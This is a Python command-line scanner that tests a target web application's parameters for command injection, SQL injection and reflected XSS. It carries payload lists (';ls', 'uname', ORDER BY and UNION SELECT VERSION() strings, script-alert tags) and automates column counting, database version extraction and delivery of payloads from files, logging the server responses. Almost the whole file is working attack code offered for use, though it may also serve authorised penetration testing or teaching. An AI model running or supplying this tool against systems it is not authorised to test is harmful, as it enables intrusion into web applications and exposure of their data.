import click
import requests
import utils as utils
import pretty_print as pp
from bcolors import bcolors
import file_handler as fh
from consts import *
from http_methods import http_methods
import re
from itertools import permutations
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

EXPLOIT_LIST = [
    '\' ORDER BY',
    '" ORDER BY',
    '1 ORDER BY',
]
DETECTION_INFOS = [
    '\' UNION SELECT ',
    '" UNION SELECT ',
    '1 UNION SELECT ',
]
XSS_DETECTION_LIST = [
    '<script>alert(\'HENLO\')</script>',
]

URLS=[]

@click.command()
@click.option('--target', '--t', required=True, help='A target host (e.g., http://localhost)')
@click.option('--urls', '--u', required=True, multiple=True, help='A list of URLs to scan')
@click.option('--methods', '--m', required=True, type=click.Choice([http_methods.GET, http_methods.POST], case_sensitive=True), multiple=True, help='A list of methods for each URL')
@click.option('--params', '--p', required=True, multiple=True, help='A list of parameters for each URL')
@click.option('--injection', '--i', required=True, type=click.Choice(['cmd', 'sql', 'xss']), multiple=True, help='The kind of injection you want to perform')
@click.option('--filename', '--f', required=True, multiple=True, help='File containing payload to inject. (Must be inside the script folder)')
def main(target, urls, methods, params, injection, filename):
    """
    Main function where requests for specified URLs are initially formed. For each method of the specified URLs it is checked 
    whether they are injectable. If they are injectable, the payload from the supplied file is injected for each parameter and the 
    result is written to an output file.
    Args:
        target (string): Target host
        urls (list of strings): A list of URLs to scan
        methods (list of strings): Methods for each URL
        params (list of strings): A list of parameters for each URL
        injection (string): The kind of injection to perform
        filename (string): File containing payload to inject. (Must be inside the script folder)
    """
    format_requests(target, urls)

    for idx, method in enumerate(methods):
        pp.info_print(f'Checking if {URLS[idx]} is injectable...')
        inj = is_injectable(idx, params, urls, method, injection)

        if not inj[0]:
            pp.fail_print(f'{URLS[idx]} seems not injectable.')
            continue

        fh.append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'Starting time: {utils.get_time()}\n\n')
        
        if not inj[1]:
            pp.success_print("I did not find any information about back-end DBMS. But it seems injectable")
        else:
            pp.success_print(f'I found an injection on the \'{params[idx]}\' parameter of the \'{URLS[idx]}\', using the \'{inj[1]}\' payload!')
        
        pp.success_print(f'Serving proivded payloads and writing results in \'{urls[idx]}-{injection[idx]}-output.txt\' file...')

        for payload in fh.read_file(filename[idx]):
            p = prepare_single_payload(params, idx, payload)
            req = make_requests(method, idx, p)
            fh.append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'PAYLOAD: {payload}\n{req.text}\n')

        pp.success_print('DONE')
        fh.append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'Ending time: {utils.get_time()}\n\n')
        
def format_requests(target, urls):
    """
    Requests for specified URLs are formed
    Args:
        target (string): Target host
        urls (list of strings): A list of URLs to scan
    """
    for url in urls:
        URLS.append(f"{target}/{url}")

def is_injectable(idx, params, urls, method, injection):
    """
    Check if the url is injectable with respective kind of injection
    Args:
        idx (int): Index of urls looped
        params (list of strings): A list of parameters for each URL
        urls (list of strings): A list of URLs to scan
        method (string): Methods for urls[idx]
        injection (string): The kind of injection to perform
    Returns:
        Tuple: result from the two injectable functions
    """
    if injection[idx] == CMD_INJECTION:
        return is_cmd_injectable(idx, params, urls, method)
    
    if injection[idx] == SQL_INJECTION:
        return is_sql_injectable(idx, params, urls, method)
    
    if injection[idx] == XSS_INJECTION:
        return is_xss_injectable(idx, params, method)

def is_cmd_injectable(idx, params, urls, method):
    """
    Check if the desired url is command injectable with the parameters provided
    Args:
        idx (int): Index of urls looped
        params (list of strings): A list of parameters for each URL
        urls (list of strings): A list of URLs to scan
        method (string): Methods for urls[idx]
    Returns:
        Tuple: Tuple that contains a boolean, true if it is injectable, false otherwise and the command injected
    """
    CMD_EXPLOIT_LIST = [
        'echo injected > cmd_inj.txt | find . -name cmd_inj.txt', 
        ';ls -a',
        f'{urls[idx]}',
        ';ls',
        'uname',
        ';uname',
    ]

    for cmd_exploit in CMD_EXPLOIT_LIST:
        payload = prepare_single_payload(params, idx, cmd_exploit)
        req = make_requests(method, idx, payload)
        if '.' in req.text and '..' in req.text or f'./{ cmd_exploit }' in req.text or 'Linux' in req.text:
            return (True, cmd_exploit)

    return (False, "")

def is_sql_injectable(idx, params, urls, method):
    """
    Check if the desired url is command injectable with the parameters provided
    Args:
        idx (int): Index of urls looped
        params (list of strings): A list of parameters for each URL
        urls (list of strings): A list of URLs to scan
        method (string): Methods for urls[idx]
    Returns:
        Tuple: Tuple that contains a boolean, true if it is injectable, false otherwise and the command injected
    """
    pp.info_print('Trying \'ORDER BY\' technique to find the right number of query columns.')

    no_col = get_columns_number(params, idx, method)

    if no_col == 0:
        pp.fail_print('\'ORDER BY\' technique it seems not to work.')
        return (False, "")

    pp.success_print(f'I Found the number of query columns: {no_col}')
    pp.info_print('Trying to retrieve database version information...')

    infos = retrieve_dbms_infos(params, method, idx, no_col) 
    
    if len(infos[1]) == 0:
        return (True, "")

    pp.success_print(f'I Found information about back-end DBMS: \'{infos[1]}\'\n')

    return (True, infos[0])

def is_xss_injectable(idx, params, method):
    rnd_str = utils.random_string(4)
    XSS_LIST = [
        f'<script>alert(\'{rnd_str}\')</script>',
        f'\'><script>alert(\'{rnd_str}\')</script>'
    ]
    for xss_exploit in XSS_LIST:
        payload = prepare_single_payload(params, idx, xss_exploit)
        req = make_requests(method, idx, payload)
        soup = BeautifulSoup(req.text, 'html.parser')
        for tag in soup.find_all('script'):
            if rnd_str in tag.string:
                #print(f'TAG --> {tag.parent.name}')
                #print(tag.parent.attrs)
                browser = webdriver.Firefox()
                browser.get(req.url)
                try:
                    WebDriverWait(browser, 3).until(EC.alert_is_present())
                    alert = browser.switch_to.alert
                    alert.accept()
                    print("alert accepted")
                except TimeoutException:
                    print("no alert")
                

    return (False, "")

def get_columns_number(params, idx, method):
    """_summary_
    Function that try to find the right number of query columns. Uses the ORDER BY technique that consist injecting a series of 
    ORDER BY clauses and incrementing the specified column index until an error occurs.
    Args:
        params (list of strings): A list of parameters for each URL
        idx (int): Index of urls looped
        method (string): Methods for urls[idx]
    Returns:
        int: Number of query columns
    """
    no_col = -1

    for index, exploit in enumerate(EXPLOIT_LIST):
        payload = prepare_single_payload(params, idx, exploit)
        for x in range(1, HEURISTIC_NO_COL):
            p = { k:v + f' {x}-- ' for k,v in payload.items() }
            req = make_requests(method, idx, p)
            if not req.text and req.status_code != 200:
                if x > no_col:
                    no_col = x - 1
                    break
    return no_col

def retrieve_dbms_infos(params, method, idx, no_col):
    """
    This function uses the right number of columns to perform an SQL injection UNION attack. In this case submit a series of 
    UNION SELECT with the VERSION() command, to retrieve DBMS version, and different number of NULL values.
    For retrieve DBMS version it use two ways:
        - the VERSION() command is between two random strings in order and checks if the random strings are inside the response;
        - regex to match a possible VERSION() output.
    It also perform all the possible permutations for type check reasons, for 2 number of columns:
    UNION SELECT VERSION(),NULL-- 
    UNION SELECT NULL,VERSION()--
    Args:
        params (list of strings): A list of parameters for each URL
        method (string): Methods for urls[idx]
        idx (int): Index of urls looped
        no_col (int): Number of query columns found
    Returns:
        Tuple: Tuple that contains a the UNION string used to retrieve DBMS informations and the Version of current DBMS.
    """
    first_str = utils.random_string(4)
    snd_str = utils.random_string(4)
    version_qry = [
        f'CONCAT(\'{first_str}\',VERSION(), \'{snd_str}\')',
        'VERSION()',
    ]

    union_str = ""
    param_list = params[idx].split(':')
    version = ""

    for v_qry in version_qry:
        cols = []
        cols.append(v_qry)
        for col in range(1, no_col):
            cols.append('NULL')
        for detection_info in DETECTION_INFOS:
            for permutationz in list(permutations(cols, no_col)):
                union_str = ""
                union_str += detection_info
                qry_str = ""
                for permutation in permutationz:
                    qry_str += f'{ permutation },'
                qry_str = qry_str[:-1]
                #print(qry_str)
                union_str += f'{qry_str}'
                union_str += '-- '
                #print(union_str)
                for param in param_list:
                    p = { param: union_str }
                    req = make_requests(method, idx, p)
                    #print(req.text)
                    if first_str in req.text:
                        start_idx = req.text.index(first_str) + len(first_str)
                        end_idx = req.text.index(snd_str)
                        version = req.text[start_idx:end_idx]
                        if len(version) > 0:
                            return (union_str, version)
                    else:
                        response = req.text.split(" ")
                        for r in response:
                            x = re.search("\d+\.\d+\.\d+", r)
                            if x:
                                version = r
                                return (union_str, version)
    
    return (union_str, version)

def prepare_single_payload(params, idx, payload):
    """_summary_
    This function fill the parameters provided with the payload to inject
    Args:
        params (list of strings): A list of parameters for each URL
        idx (int): Index of urls looped
        payload (string): The payload to inject of the payloads provided
    Returns:
        Dictionary: Dictionary of parameters(keys) with the payload(values) to inject
    """
    payload_dict = {}
    params = params[idx].split(':')
    for param in params:
        payload_dict[param]=payload
    return payload_dict

def make_requests(method, idx, payload):
    """
    This function make requests for GET and POST http methods with the given payload
    Args:
        method (string): Methods for urls[idx]
        idx (int): Index of urls looped
        payload (Dictionary): Dictionary of parameters(keys) with the payload(values) to inject
    Returns:
        Response: The response of the request
    """
    match method:
        case http_methods.GET:
            return requests.get(URLS[idx], params=payload)
        case http_methods.POST:
            return requests.post(URLS[idx], data=payload)
        case _:
            return "Method not implemented yet"    

if __name__ == '__main__':
    main()
